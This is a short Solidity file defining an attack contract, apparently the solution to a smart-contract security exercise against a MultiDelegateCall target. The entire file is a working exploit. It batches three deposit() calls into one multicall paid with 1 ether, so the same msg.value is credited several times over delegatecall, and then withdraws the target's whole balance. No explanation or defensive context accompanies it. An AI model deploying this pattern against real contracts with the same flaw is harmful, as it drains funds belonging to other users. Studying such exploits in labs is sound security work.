// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "../MultiDelegateCall.sol";

contract AttackContract {
    MultiDelegateCall public target;
    address public attacker;

    constructor(address _target) {
        target = MultiDelegateCall(_target);
        attacker = msg.sender;
    }

    function exploit() external {
        // Prepare deposit signature
        bytes memory depositSignature = abi.encodeWithSignature("deposit()");
        
        // Create array of deposit calls
        bytes[] memory data = new bytes[](3);
        data[0] = depositSignature;
        data[1] = depositSignature;
        data[2] = depositSignature;
        
        // Perform multicall with 1 ether
        target.multicall{value: 1 ether}(data);
        
        // Withdraw entire contract balance
        target.withdraw(address(target).balance);
    }

    receive() external payable {}
}